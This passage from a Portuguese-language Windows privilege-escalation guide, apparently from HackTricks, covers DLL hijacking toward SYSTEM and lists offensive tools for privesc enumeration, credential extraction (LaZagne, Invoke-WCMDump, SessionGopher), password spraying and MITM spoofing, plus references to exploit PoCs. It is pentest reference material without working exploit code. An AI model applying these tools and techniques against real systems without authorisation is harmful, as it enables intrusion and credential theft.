Se quiser [**saber mais sobre name pipes, leia isto**](#named-pipe-client-impersonation).\
Se quiser ver um exemplo de [**como passar de High Integrity para System usando name pipes, leia isto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se você conseguir **sequestrar uma dll** que esteja sendo **carregada** por um **processo** em execução como **SYSTEM**, poderá executar código arbitrário com essas permissões. Portanto, Dll Hijacking também é útil para esse tipo de escalada de privilégios e, além disso, é muito **mais fácil de realizar a partir de um processo de High Integrity**, pois ele terá **permissões de escrita** nas pastas usadas para carregar dlls.\
**Você pode** [**saber mais sobre Dll hijacking aqui**](dll-hijacking/index.html)**.**

### **De Administrator ou Network Service para System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### De LOCAL SERVICE ou NETWORK SERVICE para privilégios totais

**Leia:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Mais ajuda

[Binários estáticos do impacket](https://github.com/ropnop/impacket_static_binaries)

## Ferramentas úteis

**Melhor ferramenta para procurar vetores de escalada de privilégios locais no Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Procura por configurações incorretas e arquivos confidenciais (**[**veja aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Procura possíveis configurações incorretas e coleta informações (**[**veja aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Procura configurações incorretas**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrai informações de sessões salvas do PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Use -Thorough localmente.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrai credenciais do Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Testa por spray as senhas coletadas no domínio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh é uma ferramenta PowerShell de spoofing de ADIDNS/LLMNR/mDNS e man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeração básica do Windows para privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Procura vulnerabilidades conhecidas de privesc (SUBSTITUÍDO pelo Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Verificações locais **(Requer direitos de Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Procura vulnerabilidades conhecidas de privesc (precisa ser compilado usando VisualStudio) ([**pré-compilado**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera o host em busca de configurações incorretas (é mais uma ferramenta de coleta de informações do que de privesc) (precisa ser compilado) **(**[**pré-compilado**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrai credenciais de vários softwares (exe pré-compilado no GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port do PowerUp para C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Procura configurações incorretas (executável pré-compilado no GitHub). Não recomendado. Não funciona bem no Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Procura possíveis configurações incorretas (exe feito em Python). Não recomendado. Não funciona bem no Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Ferramenta criada com base nesta publicação (não precisa do accesschk para funcionar corretamente, mas pode usá-lo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lê a saída de **systeminfo** e recomenda exploits funcionais (Python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lê a saída de **systeminfo** e recomenda exploits funcionais (Python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Você precisa compilar o projeto usando a versão correta do .NET ([veja isto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver a versão do .NET instalada no host da vítima, você pode executar:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Fundamentos de Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Elevação de privilégios explorando permissões fracas em pastas](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - um cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop de Local Privilege Escalation para Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Ataques ao Windows: AT é o novo preto (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Guia OSCP completo](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Guia de Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Checklist de Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Métodos de Privilege Escalation no Windows para Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing com macro VBA do Word via SMTP → descriptografia de credenciais do hMailServer → Veeam CVE-2023-27532 para SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak de format-string + stack BOF → ROP com VirtualAlloc (RCE) e roubo de token do kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – À caça da Silver Fox: gato e rato nas sombras do kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Vulnerabilidade de sistema de arquivos privilegiado presente em um sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Ferramentas de teste de symbolic link – uso do CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [De volta ao passado. Abusando de symbolic links no Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port do Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js confia demais: resolução perigosa de módulos no Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Módulos do Node.js: carregamento de pastas `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - desafios da checklist de C/C++, resolvidos](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - função RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own com Microslop: encadeando condições de corrida do CLDFLT e do kernel DirectX para Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Um único I/O Ring para dominar todos: uma primitiva completa de exploit de leitura/gravação no Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Abusando de exclusões arbitrárias de arquivos para escalar privilégios e outros truques úteis](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - código de exploit de FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Ataques ao WSUS, parte 2: CVE-2020-1013, uma vulnerabilidade de Local Privilege Escalation de um dia no Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: explorando o Credential Manager e o Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC de CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Delegação restrita baseada em recursos do Kerberos: quando uma alteração de imagem leva à elevação de privilégios](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Extraindo chaves privadas SSH do agente SSH do Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Transformando servidores de atualização corporativos em fábricas de backdoors (0_o) – Parte 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Transformando servidores de atualização corporativos em fábricas de backdoors (0_o) – Parte 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Escalação de privilégios por exclusão de pastas do Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
